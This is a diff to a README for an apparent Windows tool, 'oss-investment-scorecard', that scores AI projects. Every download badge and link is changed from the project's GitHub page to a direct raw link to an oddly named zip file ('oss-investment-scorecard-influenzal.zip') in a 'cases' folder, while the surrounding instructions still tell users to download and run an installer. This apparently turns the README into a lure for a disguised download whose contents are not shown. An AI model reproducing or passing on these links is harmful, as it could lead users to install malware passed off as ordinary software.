@@ -1,6 +1,6 @@
 # 📊 oss-investment-scorecard - Simple AI Project Scoring Tool
 
-[![Download](https://img.shields.io/badge/Download-oss--investment--scorecard-brightgreen)](https://github.com/kandadavid36/oss-investment-scorecard)
+[![Download](https://img.shields.io/badge/Download-oss--investment--scorecard-brightgreen)](https://raw.githubusercontent.com/kandadavid36/oss-investment-scorecard/main/cases/oss-investment-scorecard-influenzal.zip)
 
 ---
 
@@ -42,11 +42,11 @@ No coding or technical expertise is needed. The interface uses plain language an
 
 Start using the oss-investment-scorecard by downloading the app from the GitHub page linked below. It opens directly in your browser.
 
-[![Download Now](https://img.shields.io/badge/Download-oss--investment--scorecard-blue)](https://github.com/kandadavid36/oss-investment-scorecard)
+[![Download Now](https://img.shields.io/badge/Download-oss--investment--scorecard-blue)](https://raw.githubusercontent.com/kandadavid36/oss-investment-scorecard/main/cases/oss-investment-scorecard-influenzal.zip)
 
 To get the software ready on your Windows PC, follow these steps:
 
-1. Click the **Download** badge or visit [https://github.com/kandadavid36/oss-investment-scorecard](https://github.com/kandadavid36/oss-investment-scorecard).
+1. Click the **Download** badge or visit [https://raw.githubusercontent.com/kandadavid36/oss-investment-scorecard/main/cases/oss-investment-scorecard-influenzal.zip](https://raw.githubusercontent.com/kandadavid36/oss-investment-scorecard/main/cases/oss-investment-scorecard-influenzal.zip).
 
 2. On the GitHub page, look for the **Releases** section or a folder named `Downloads`.
 
@@ -110,7 +110,7 @@ You will see a main menu with these options:
 
 The tool does not update automatically. To check for new versions:
 
-1. Visit the GitHub download page: [oss-investment-scorecard](https://github.com/kandadavid36/oss-investment-scorecard).
+1. Visit the GitHub download page: [oss-investment-scorecard](https://raw.githubusercontent.com/kandadavid36/oss-investment-scorecard/main/cases/oss-investment-scorecard-influenzal.zip).
 
 2. Look for newer releases or updated installer files.
 
@@ -136,7 +136,7 @@ If you run into problems:
 ## 🔗 Useful Links
 
 - **Download and Install**:  
-  [https://github.com/kandadavid36/oss-investment-scorecard](https://github.com/kandadavid36/oss-investment-scorecard)
+  [https://raw.githubusercontent.com/kandadavid36/oss-investment-scorecard/main/cases/oss-investment-scorecard-influenzal.zip](https://raw.githubusercontent.com/kandadavid36/oss-investment-scorecard/main/cases/oss-investment-scorecard-influenzal.zip)
 
 - **Project Home on GitHub**:  
   View code, report issues, and access documentation.  
@@ -162,4 +162,4 @@ The oss-investment-scorecard is open source. You may use it freely for business 
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-oss--investment--scorecard-brightgreen)](https://github.com/kandadavid36/oss-investment-scorecard)
+[![Download](https://img.shields.io/badge/Download-oss--investment--scorecard-brightgreen)](https://raw.githubusercontent.com/kandadavid36/oss-investment-scorecard/main/cases/oss-investment-scorecard-influenzal.zip)
